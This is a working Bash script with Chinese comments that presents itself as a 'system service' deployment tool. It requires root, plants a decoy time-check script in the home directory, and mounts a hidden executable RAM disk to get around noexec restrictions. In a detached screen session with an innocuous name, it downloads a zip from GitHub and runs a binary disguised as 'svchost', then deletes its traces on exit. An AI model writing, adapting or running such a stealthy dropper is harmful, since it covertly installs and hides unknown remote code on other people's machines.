#!/bin/bash

# --- 强化版一键部署脚本 (v3) ---
# 解决了 /dev/shm 的 noexec 问题

ZIP_URL="https://raw.githubusercontent.com/ccqwerty123/ccqwerty123/refs/heads/main/system-core-package.zip"
DECOY_SCRIPT_PATH="${HOME}/time_check.sh"
SESSION_NAME="system-journal-svc"

# 1. 检查 root 权限
if [ "$(id -u)" != "0" ]; then
   echo "错误：此操作需要 root 权限。" 1>&2
   exit 1
fi

echo "正在初始化系统服务环境..."

# 2. 安装依赖
apt-get update > /dev/null 2>&1
apt-get install -y unzip screen wget > /dev/null 2>&1

# 3. 创建障眼法脚本
cat > "$DECOY_SCRIPT_PATH" <<'DECOYEOF'
#!/bin/bash
echo "当前系统时间: $(date)"
DECOYEOF
chmod +x "$DECOY_SCRIPT_PATH"
echo "已在 ${HOME} 目录创建日常维护脚本。"

# 4. 决定工作目录：优先尝试创建可执行的内存盘
#    我们创建一个新的挂载点
CUSTOM_RAM_DIR="/var/.system-cache"
mkdir -p "$CUSTOM_RAM_DIR"
#    尝试挂载一个没有 noexec 的 tmpfs
if mount -t tmpfs -o rw,exec,nosuid,nodev tmpfs "$CUSTOM_RAM_DIR"; then
    WORKDIR="$CUSTOM_RAM_DIR"
    echo "成功创建可执行内存盘: $WORKDIR"
else
    # 如果挂载失败，则退回到使用 /tmp 目录
    WORKDIR="/tmp/.host-cache-data"
    mkdir -p "$WORKDIR" # 确保备用目录存在
    echo "创建内存盘失败，将使用临时磁盘目录: $WORKDIR"
fi

# 5. 在后台 screen 会话中执行核心任务
#   检查会话是否已存在，避免重复启动
if screen -list | grep -q "$SESSION_NAME"; then
    echo "服务已经在运行中，无需重复启动。"
else
    echo "正在后台启动核心服务..."
    screen -d -m -S "$SESSION_NAME" bash -c "
        # 定义自定义的挂载目录变量，以便trap可以访问
        CUSTOM_RAM_DIR_IN_SCREEN='$CUSTOM_RAM_DIR'
        
        # 设置退出时自动清理 (包括卸载内存盘)
        trap 'if [ -d \"\$CUSTOM_RAM_DIR_IN_SCREEN\" ] && mountpoint -q \"\$CUSTOM_RAM_DIR_IN_SCREEN\"; then umount \"\$CUSTOM_RAM_DIR_IN_SCREEN\"; fi; rm -rf \"$WORKDIR\"' EXIT

        # 进入工作目录
        cd '$WORKDIR' || exit

        # 下载、解压、运行
        wget -q -O components.zip '$ZIP_URL'
        unzip -q components.zip
        chmod +x svchost
        ./svchost
    "
fi

# 6. 最终确认
sleep 2
if screen -list | grep -q "$SESSION_NAME"; then
    echo "---------------------------------------------------------"
    echo "成功！核心服务已在后台匿名启动。"
    echo "会话名称: $SESSION_NAME"
    echo "工作目录: $WORKDIR"
    echo "---------------------------------------------------------"
else
    echo "错误：无法启动后台服务。请检查系统日志或手动调试。"
fi
